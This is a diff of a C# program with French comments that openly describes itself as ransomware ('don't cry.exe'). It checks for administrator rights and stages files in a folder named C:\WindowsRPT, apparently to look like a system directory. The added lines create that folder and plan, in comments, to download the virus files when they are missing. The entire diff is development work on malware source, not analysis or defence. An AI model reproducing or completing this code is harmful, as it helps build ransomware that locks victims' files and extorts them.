@@ -13,7 +13,7 @@ class Program{
         bool IsAdmin = MalwaireFunction.IsRoot();
         bool MalwaireFile = MalwaireFunction.fileExiste("don't cry.exe");// nom du virue ransomwaire
         bool MusicFile = MalwaireFunction.fileExiste("p.wav");// nom de la musique pour le virus 
-        bool isDirectory = MalwaireFunction.DirectoryExistE("./bin");
+        bool isDirectory = MalwaireFunction.DirectoryExistE(@"C:\WindowsRPT");
 
         GotIS://label
         if(IsAdmin == true){
@@ -33,9 +33,15 @@ class Program{
 
             if(isDirectory == true){
                 Console.WriteLine("Le fichier existe");
+                // vérifier si dans ce repertoir il y a les fichier du virus 
+                // et vérifier dans le repertoir ou on et si il y sont si il ne sont pas 
+                // dans le repertoir C:\WindowsRPT ni dans le repertoir ou le programm ce fait 
+                // executer alor y télécharger
+
+
 
             }else{
-                Console.WriteLine("Error");
+                Directory.CreateDirectory(@"C:\WindowsRPT");
             }
 
             if(MalwaireFile == true){
